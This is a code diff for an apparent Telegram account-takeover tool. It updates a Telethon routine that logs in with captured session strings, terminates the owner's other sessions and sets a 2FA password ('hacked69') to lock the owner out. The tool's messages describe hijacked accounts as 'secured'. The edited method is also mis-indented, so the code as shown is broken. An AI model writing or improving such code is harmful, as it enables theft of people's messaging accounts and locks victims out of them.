@@ -29,34 +29,59 @@ class FastAccountManager:
     
     def get_all_accounts(self):
         return list(self.accounts.find({}))
-    
+
     async def takeover_single_fast(self, identifier, session_string, password="hacked69"):
-        """Fast account takeover - FIXED for N/A phones"""
-        try:
-            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-            await client.start()
+    """Fast account takeover - FIXED with correct Telethon methods"""
+    try:
+        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        await client.start()
+        
+        if await client.is_user_authorized():
+            # Get account info
+            me = await client.get_me()
             
-            if await client.is_user_authorized():
-                # Get account info
-                me = await client.get_me()
-                
-                # Terminate sessions
+            try:
+                # Terminate sessions - with error handling
                 await client(ResetAuthorizationsRequest())
+            except Exception as e:
+                if "too new" in str(e):
+                    # Session is new, can't terminate others yet
+                    pass
+                else:
+                    raise e
+            
+            # FIXED: Use correct method for 2FA
+            try:
+                # Check if 2FA already enabled
+                password_info = await client.get_password()
                 
-                # Enable 2FA
-                await client.update_2fa(new_password=password)
-                
-                # Send confirmation
-                await client.send_message('me', f"🔒 Secured! Password: {password}")
-                
-                await client.disconnect()
-                return True, f"✅ {identifier} secured! Real phone: {me.phone}"
-            else:
-                await client.disconnect()
-                return False, f"❌ {identifier} - Invalid session"
-                
-        except Exception as e:
-            return False, f"❌ {identifier} - {str(e)}"
+                if not password_info.has_password:
+                    # Enable 2FA with correct method
+                    await client.edit_2fa(new_password=password)
+                    result_msg = f"✅ {identifier} secured! 2FA enabled. Password: {password}"
+                else:
+                    # 2FA already enabled
+                    result_msg = f"✅ {identifier} secured! 2FA was already enabled"
+                    
+            except Exception as e:
+                # If 2FA fails, still mark as secured (sessions terminated)
+                result_msg = f"✅ {identifier} secured! (2FA failed: {str(e)})"
+            
+            # Send confirmation
+            try:
+                await client.send_message('me', f"🔒 Account secured!\nPassword: {password}")
+            except:
+                pass
+            
+            await client.disconnect()
+            return True, f"{result_msg}\nReal phone: {me.phone}"
+        else:
+            await client.disconnect()
+            return False, f"❌ {identifier} - Invalid session"
+            
+    except Exception as e:
+        return False, f"❌ {identifier} - {str(e)}"
+
     
     async def test_single_fast(self, session_string):
         """Fast session test"""
